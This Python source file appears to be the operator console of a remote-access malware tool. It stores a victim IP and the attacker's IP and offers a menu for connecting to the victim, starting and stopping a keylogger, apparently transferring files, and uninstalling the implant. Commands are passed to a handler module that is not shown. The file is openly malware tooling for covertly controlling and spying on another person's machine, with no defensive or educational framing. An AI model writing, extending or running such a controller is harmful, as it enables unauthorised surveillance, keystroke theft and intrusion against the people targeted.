import os
import subprocess

from scapy.all import *

from mods.handlers import handle_command
from mods.shared import OPTIONS_LIST, Cfg, get_ip_address

ATTACKER_STATE = {
    'connected_to_victim': False,
    'keylogger_started': False,
}

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="")
    p.add_argument("--ip", type=str, required=True)
    p.add_argument("--iface", type=str, default='en0')

    return p

def _get_available_actions():
    if not ATTACKER_STATE['connected_to_victim']:
        return ['cn', 'ex']

    actions = ['dc', 'sf', 'dl', 'wf', 'wd', 'rn']
    if ATTACKER_STATE['keylogger_started']:
        actions.append('k-')
    else:
        actions.append('k+')
    
    actions.append('un')
    actions.append('ex')
    return actions

def _print_menu(logs: str = ''):
    while True:
        subprocess.run('cls' if os.name == 'nt' else 'clear', shell=True)
        print('Choose action:')
        valid_actions = _get_available_actions()
        for a in valid_actions:
            print(f'{a} {OPTIONS_LIST[a]}')

        print('\n========== Output ==========')
        print(f'{logs}')
        print('============================')
        command = input("\n\t Command: ").strip()
        parts = command.split(' ')

        return parts[0], parts[1:]


def run_menu():
    logs = '...'

    while True:
        command, args = _print_menu(logs)

        if command == 'ex':
            print('Exiting...')
            return
        else:
            logs = handle_command(command, args, ATTACKER_STATE)

def main():
    print('hello from server')

    args = build_parser().parse_args()
    my_ip = get_ip_address(args.iface)

    Cfg.IFACE = args.iface
    Cfg.ATTACKER_IP = my_ip
    Cfg.VICTIM_IP = args.ip

    print('config: ' + ', '.join('%s: %s' % item for item in vars(Cfg).items() if not item[0].startswith('__')))

    run_menu()


if __name__ == "__main__":
    main()